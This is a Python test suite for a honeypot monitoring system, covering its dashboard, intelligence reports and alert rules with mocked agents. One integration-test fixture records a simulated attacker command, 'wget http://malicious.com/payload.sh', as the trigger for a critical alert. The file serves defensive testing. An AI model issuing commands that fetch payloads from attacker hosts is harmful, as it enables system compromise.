"""
Test suite for Management Dashboard and Monitoring System
Tests the web-based dashboard, reporting system, and alerting functionality.
"""

import asyncio
import pytest
import json
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch

from management.dashboard import DashboardManager, HoneypotDisplayStatus, SystemMetrics
from management.reporting import IntelligenceReportingSystem, ReportType, ReportFormat
from management.alerting import AlertingNotificationSystem, AlertSeverity, NotificationChannel


class TestDashboardManager:
    """Test cases for Dashboard Manager"""
    
    @pytest.fixture
    def dashboard_manager(self):
        """Create dashboard manager for testing"""
        mock_coordinator = Mock()
        mock_coordinator.get_system_status_tool = AsyncMock(return_value={
            "status": "healthy",
            "honeypots": {},
            "agent_health": {"detection": "healthy", "coordinator": "healthy"}
        })
        mock_coordinator.get_agentcore_metrics_tool = AsyncMock(return_value={
            "agent_instances": {
                "detection": {"count": 2, "status": "healthy"},
                "coordinator": {"count": 1, "status": "healthy"},
                "interaction": {"count": 3, "status": "healthy"},
                "intelligence": {"count": 2, "status": "healthy"}
            },
            "message_queue_depth": 0,
            "workflow_executions": 5,
            "runtime_health": "healthy"
        })
        
        return DashboardManager(coordinator_agent=mock_coordinator)
    
    @pytest.mark.asyncio
    async def test_dashboard_initialization(self, dashboard_manager):
        """Test dashboard manager initialization"""
        assert dashboard_manager is not None
        assert dashboard_manager.status.value == "active"
        assert len(dashboard_manager.honeypot_data) == 0
        assert len(dashboard_manager.system_metrics_history) == 0
    
    @pytest.mark.asyncio
    async def test_get_system_status(self, dashboard_manager):
        """Test getting system status"""
        status = await dashboard_manager.get_system_status()
        
        assert "dashboard_status" in status
        assert "timestamp" in status
        assert "coordinator_status" in status
        assert status["dashboard_status"] == "active"
    
    @pytest.mark.asyncio
    async def test_get_agentcore_metrics(self, dashboard_manager):
        """Test getting AgentCore Runtime metrics"""
        metrics = await dashboard_manager._get_agentcore_metrics()
        
        assert "agent_instances" in metrics
        assert "message_queue_depth" in metrics
        assert "runtime_health" in metrics
        assert metrics["runtime_health"] == "healthy"
    
    @pytest.mark.asyncio
    async def test_create_honeypot_manual(self, dashboard_manager):
        """Test manual honeypot creation"""
        dashboard_manager.coordinator_agent.create_honeypot_tool = Mock(return_value={"success": True})
        
        request = {
            "honeypot_type": "web_admin",
            "config": {"port": 8080}
        }
        
        result = await dashboard_manager.create_honeypot_manual(request)
        
        assert result["success"] is True
        assert "honeypot_id" in result
    
    @pytest.mark.asyncio
    async def test_emergency_shutdown(self, dashboard_manager):
        """Test emergency shutdown functionality"""
        dashboard_manager.coordinator_agent.emergency_shutdown_tool = Mock(return_value={"success": True})
        
        request = {"reason": "Test emergency shutdown"}
        result = await dashboard_manager.emergency_shutdown(request)
        
        assert result["success"] is True
        assert result["action"] == "emergency_shutdown_initiated"
    
    @pytest.mark.asyncio
    async def test_bulk_honeypot_action(self, dashboard_manager):
        """Test bulk honeypot actions"""
        honeypot_ids = ["hp1", "hp2", "hp3"]
        
        result = await dashboard_manager.perform_bulk_honeypot_action(honeypot_ids, "restart")
        
        assert result["success"] is True
        assert result["total_processed"] == 3
        assert "results" in result


class TestIntelligenceReportingSystem:
    """Test cases for Intelligence Reporting System"""
    
    @pytest.fixture
    def reporting_system(self):
        """Create reporting system for testing"""
        mock_intelligence_agent = Mock()
        mock_intelligence_agent.get_sessions_in_range = AsyncMock(return_value=[])
        mock_intelligence_agent.get_interactions_in_range = AsyncMock(return_value=[])
        mock_intelligence_agent.get_technique_analysis = AsyncMock(return_value={})
        
        return IntelligenceReportingSystem(
            intelligence_agent=mock_intelligence_agent,
            config={"auto_generate_enabled": False}
        )
    
    @pytest.mark.asyncio
    async def test_reporting_system_initialization(self, reporting_system):
        """Test reporting system initialization"""
        assert reporting_system is not None
        assert len(reporting_system.generated_reports) == 0
        assert len(reporting_system.report_history) == 0
    
    @pytest.mark.asyncio
    async def test_generate_daily_report(self, reporting_system):
        """Test generating daily summary report"""
        report = await reporting_system.generate_report(ReportType.DAILY_SUMMARY)
        
        assert report is not None
        assert report.report_type == ReportType.DAILY_SUMMARY
        assert "Daily Intelligence Summary" in report.title
        assert report.confidence_score >= 0.0
    
    @pytest.mark.asyncio
    async def test_export_report_json(self, reporting_system):
        """Test exporting report in JSON format"""
        report = await reporting_system.generate_report(ReportType.DAILY_SUMMARY)
        exported_data = await reporting_system.export_report(report.report_id, ReportFormat.JSON)
        
        assert exported_data is not None
        # Verify it's valid JSON
        parsed_data = json.loads(exported_data)
        assert "report_id" in parsed_data
        assert "report_type" in parsed_data
    
    @pytest.mark.asyncio
    async def test_get_trend_analysis(self, reporting_system):
        """Test trend analysis functionality"""
        trends = await reporting_system.get_trend_analysis(days=7)
        
        assert "time_period" in trends
        assert "total_techniques" in trends
        assert trends["time_period"] == "7 days"
    
    @pytest.mark.asyncio
    async def test_create_custom_report_template(self, reporting_system):
        """Test creating custom report template"""
        template_config = {
            "title_template": "Custom Security Report - {date}",
            "description_template": "Custom report for {organization}",
            "sections": ["summary", "threats", "recommendations"],
            "export_formats": [ReportFormat.HTML, ReportFormat.PDF]
        }
        
        template_id = await reporting_system.create_report_template("custom_security", template_config)
        
        assert template_id is not None
        assert "custom_security" in reporting_system.report_templates
    
    @pytest.mark.asyncio
    async def test_schedule_report(self, reporting_system):
        """Test scheduling automatic reports"""
        schedule_id = await reporting_system.schedule_report(
            ReportType.WEEKLY_ANALYSIS,
            "0 0 * * 1",  # Every Monday at midnight
            [ReportFormat.JSON, ReportFormat.HTML]
        )
        
        assert schedule_id is not None


class TestAlertingNotificationSystem:
    """Test cases for Alerting and Notification System"""
    
    @pytest.fixture
    def alerting_system(self):
        """Create alerting system for testing"""
        mock_coordinator = Mock()
        mock_coordinator.get_system_status_tool = AsyncMock(return_value={
            "system_status": "healthy",
            "agent_health": {"detection": "healthy"}
        })
        
        return AlertingNotificationSystem(
            coordinator_agent=mock_coordinator,
            config={"max_alerts_per_hour": 10}
        )
    
    @pytest.mark.asyncio
    async def test_alerting_system_initialization(self, alerting_system):
        """Test alerting system initialization"""
        assert alerting_system is not None
        assert len(alerting_system.alert_rules) > 0  # Default rules should be created
        assert len(alerting_system.active_alerts) == 0
    
    @pytest.mark.asyncio
    async def test_create_alert_rule(self, alerting_system):
        """Test creating alert rule"""
        rule_id = await alerting_system.create_alert_rule(
            name="Test High Threat Alert",
            description="Alert for high threat scores",
            severity=AlertSeverity.HIGH,
            conditions={"threat_score": ">0.8"},
            notification_channels=[NotificationChannel.EMAIL]
        )
        
        assert rule_id is not None
        assert rule_id in alerting_system.alert_rules
        
        rule = alerting_system.alert_rules[rule_id]
        assert rule.name == "Test High Threat Alert"
        assert rule.severity == AlertSeverity.HIGH
    
    @pytest.mark.asyncio
    async def test_create_alert(self, alerting_system):
        """Test creating alert"""
        # First create a rule
        rule_id = await alerting_system.create_alert_rule(
            name="Test Alert",
            description="Test alert rule",
            severity=AlertSeverity.MEDIUM,
            conditions={},
            notification_channels=[NotificationChannel.EMAIL]
        )
        
        # Create alert
        alert_id = await alerting_system.create_alert(
            rule_id=rule_id,
            title="Test Alert Instance",
            description="This is a test alert",
            source="test_system",
            source_data={"test": True}
        )
        
        assert alert_id is not None
        assert alert_id in alerting_system.active_alerts
        
        alert = alerting_system.active_alerts[alert_id]
        assert alert.title == "Test Alert Instance"
        assert alert.severity == AlertSeverity.MEDIUM
    
    @pytest.mark.asyncio
    async def test_acknowledge_alert(self, alerting_system):
        """Test acknowledging alert"""
        # Create rule and alert
        rule_id = await alerting_system.create_alert_rule(
            name="Test Alert",
            description="Test alert rule",
            severity=AlertSeverity.MEDIUM,
            conditions={},
            notification_channels=[]
        )
        
        alert_id = await alerting_system.create_alert(
            rule_id=rule_id,
            title="Test Alert",
            description="Test alert",
            source="test",
            source_data={}
        )
        
        # Acknowledge alert
        result = await alerting_system.acknowledge_alert(alert_id, "test_user")
        
        assert result is True
        alert = alerting_system.active_alerts[alert_id]
        assert alert.acknowledged_by == "test_user"
        assert alert.acknowledged_at is not None
    
    @pytest.mark.asyncio
    async def test_configure_notification_channel(self, alerting_system):
        """Test configuring notification channel"""
        config_id = await alerting_system.configure_notification_channel(
            channel=NotificationChannel.EMAIL,
            config={
                "smtp_server": "smtp.example.com",
                "username": "test@example.com",
                "password": "password",
                "from_email": "alerts@example.com",
                "to_emails": ["admin@example.com"]
            }
        )
        
        assert config_id is not None
        assert config_id in alerting_system.notification_configs
        
        config = alerting_system.notification_configs[config_id]
        assert config.channel == NotificationChannel.EMAIL
        assert config.enabled is True
    
    @pytest.mark.asyncio
    async def test_get_active_alerts(self, alerting_system):
        """Test getting active alerts"""
        # Create some test alerts
        rule_id = await alerting_system.create_alert_rule(
            name="Test Alert",
            description="Test alert rule",
            severity=AlertSeverity.HIGH,
            conditions={},
            notification_channels=[]
        )
        
        await alerting_system.create_alert(
            rule_id=rule_id,
            title="Alert 1",
            description="First alert",
            source="test",
            source_data={}
        )
        
        await alerting_system.create_alert(
            rule_id=rule_id,
            title="Alert 2", 
            description="Second alert",
            source="test",
            source_data={}
        )
        
        # Get active alerts
        active_alerts = await alerting_system.get_active_alerts()
        
        assert len(active_alerts) == 2
        
        # Test filtering by severity
        high_alerts = await alerting_system.get_active_alerts(AlertSeverity.HIGH)
        assert len(high_alerts) == 2


class TestIntegrationScenarios:
    """Integration test scenarios"""
    
    @pytest.mark.asyncio
    async def test_high_threat_detection_workflow(self):
        """Test complete workflow from threat detection to alert and report"""
        # Setup components
        mock_coordinator = Mock()
        mock_coordinator.get_system_status_tool = AsyncMock(return_value={
            "system_status": "healthy",
            "agent_health": {"detection": "healthy"}
        })
        
        dashboard = DashboardManager(coordinator_agent=mock_coordinator)
        alerting = AlertingNotificationSystem(coordinator_agent=mock_coordinator)
        reporting = IntelligenceReportingSystem()
        
        # Simulate high-threat interaction
        high_threat_interaction = {
            "interaction_id": "int_001",
            "honeypot_id": "hp_001",
            "honeypot_type": "ssh",
            "timestamp": datetime.utcnow().isoformat(),
            "attacker_ip": "192.168.1.100",
            "command": "wget http://malicious.com/payload.sh",
            "threat_score": 0.95,
            "mitre_techniques": ["T1105", "T1059"]
        }
        
        # Create alert rule for high threats
        rule_id = await alerting.create_alert_rule(
            name="High Threat Detection",
            description="Alert for high-confidence threats",
            severity=AlertSeverity.CRITICAL,
            conditions={"threat_score": ">0.9"},
            notification_channels=[NotificationChannel.EMAIL]
        )
        
        # Trigger alert
        alert_id = await alerting.create_alert(
            rule_id=rule_id,
            title="Critical Threat Detected",
            description=f"High-threat activity from {high_threat_interaction['attacker_ip']}",
            source="threat_detection",
            source_data=high_threat_interaction
        )
        
        # Verify alert was created
        assert alert_id is not None
        active_alerts = await alerting.get_active_alerts()
        assert len(active_alerts) == 1
        assert active_alerts[0].severity == AlertSeverity.CRITICAL
        
        # Generate intelligence report
        report = await reporting.generate_report(ReportType.DAILY_SUMMARY)
        assert report is not None
        
        # Export report for SIEM
        json_export = await reporting.export_report(report.report_id, ReportFormat.JSON)
        assert json_export is not None
    
    @pytest.mark.asyncio
    async def test_system_emergency_response(self):
        """Test system emergency response workflow"""
        mock_coordinator = Mock()
        mock_coordinator.get_system_status_tool = AsyncMock(return_value={
            "system_status": "emergency",
            "agent_health": {"detection": "failed", "coordinator": "healthy"}
        })
        mock_coordinator.emergency_shutdown_tool = Mock(return_value={"success": True})
        
        dashboard = DashboardManager(coordinator_agent=mock_coordinator)
        alerting = AlertingNotificationSystem(coordinator_agent=mock_coordinator)
        
        # Simulate system emergency
        await alerting._check_system_health_alerts({
            "system_status": "emergency",
            "agent_health": {"detection": "failed"}
        })
        
        # Verify emergency alerts were created
        active_alerts = await alerting.get_active_alerts()
        emergency_alerts = [a for a in active_alerts if "emergency" in a.title.lower()]
        assert len(emergency_alerts) > 0
        
        # Test emergency shutdown
        result = await dashboard.emergency_shutdown({"reason": "System compromise detected"})
        assert result["success"] is True


if __name__ == "__main__":
    # Run basic functionality test
    async def run_basic_test():
        print("Testing Management Dashboard and Monitoring System...")
        
        # Test dashboard
        dashboard = DashboardManager()
        status = await dashboard.get_system_status()
        print(f"Dashboard Status: {status['dashboard_status']}")
        
        # Test reporting
        reporting = IntelligenceReportingSystem(config={"auto_generate_enabled": False})
        report = await reporting.generate_report(ReportType.DAILY_SUMMARY)
        print(f"Generated Report: {report.title}")
        
        # Test alerting
        alerting = AlertingNotificationSystem()
        rule_id = await alerting.create_alert_rule(
            name="Test Rule",
            description="Test alert rule",
            severity=AlertSeverity.MEDIUM,
            conditions={},
            notification_channels=[]
        )
        print(f"Created Alert Rule: {rule_id}")
        
        print("All tests completed successfully!")
    
    asyncio.run(run_basic_test())